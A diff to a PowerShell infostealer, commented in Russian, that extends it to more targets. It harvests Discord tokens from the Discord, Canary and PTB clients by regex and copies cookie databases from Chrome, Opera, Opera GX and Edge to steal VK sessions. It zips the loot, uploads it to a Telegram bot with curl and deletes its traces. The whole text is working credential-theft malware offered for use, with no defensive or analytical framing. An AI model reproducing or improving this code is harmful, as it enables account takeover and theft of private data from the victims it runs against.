@@ -6,36 +6,46 @@ $tempPath = $env:TEMP
 $zipPath = "$tempPath\data.zip"
 $filesToZip = @()
 
-# 1. СБОР ТОКЕНОВ DISCORD
-$discordPath = "$env:APPDATA\discord\Local Storage\leveldb"
+# 1. СБОР ТОКЕНОВ DISCORD (Браузер + Приложения)
+$discordPaths = @(
+    "$env:APPDATA\discord\Local Storage\leveldb",
+    "$env:APPDATA\discordcanary\Local Storage\leveldb",
+    "$env:APPDATA\discordptb\Local Storage\leveldb"
+)
+
 $discordTokens = @()
-if (Test-Path $discordPath) {
-    Get-ChildItem "$discordPath\*.ldb" | ForEach-Object {
-        $content = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue
-        $matches = [regex]::Matches($content, '[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9]{27}')
-        foreach ($m in $matches) {
-            $discordTokens += $m.Value
+foreach ($path in $discordPaths) {
+    if (Test-Path $path) {
+        Get-ChildItem "$path\*.ldb" | ForEach-Object {
+            $content = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue
+            # Регулярка ищет стандартный формат токена Discord
+            $matches = [regex]::Matches($content, '[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9]{27}')
+            foreach ($m in $matches) {
+                $discordTokens += $m.Value
+            }
         }
     }
 }
+
 if ($discordTokens.Count -gt 0) {
-    $discordTokens | Out-File "$tempPath\discord.txt" -Encoding utf8
+    # Удаляем дубликаты
+    $uniqueTokens = $discordTokens | Select-Object -Unique
+    $uniqueTokens | Out-File "$tempPath\discord.txt" -Encoding utf8
     $filesToZip += "$tempPath\discord.txt"
 }
 
-# 2. СБОР КУКИ ВК (Грубый метод, копируем базу)
-# Современный Chrome шифрует их, но если у жертвы Opera или старый Chrome, это сработает
+# 2. СБОР КУКИ ВК (Копируем базы браузеров)
 $browserPaths = @(
     "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies",
     "$env:APPDATA\Opera Software\Opera Stable\Default\Network\Cookies",
-    "$env:APPDATA\Opera Software\Opera GX Stable\Default\Network\Cookies"
+    "$env:APPDATA\Opera Software\Opera GX Stable\Default\Network\Cookies",
+    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Network\Cookies"
 )
 
 foreach ($path in $browserPaths) {
     if (Test-Path $path) {
-        $browserName = (Get-Item $path).Directory.Parent.Parent.Name
-        $dest = "$tempPath\cookies_$browserName.db"
-        Copy-Item $path $dest -Force
+        $dest = "$tempPath\cookies_$(Get-Random).db"
+        Copy-Item $path $dest -Force -ErrorAction SilentlyContinue
         if (Test-Path $dest) {
             $filesToZip += $dest
         }
@@ -49,6 +59,9 @@ if ($filesToZip.Count -gt 0) {
     $url = "https://api.telegram.org/bot$botToken/sendDocument"
     curl.exe -s -F "chat_id=$chatId" -F "document=@$zipPath" $url > $null
     
-    Remove-Item $zipPath
-    foreach ($f in $filesToZip) { Remove-Item $f -Force }
+    # Очистка следов
+    Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
+    foreach ($f in $filesToZip) { 
+        Remove-Item $f -Force -ErrorAction SilentlyContinue 
+    }
 }
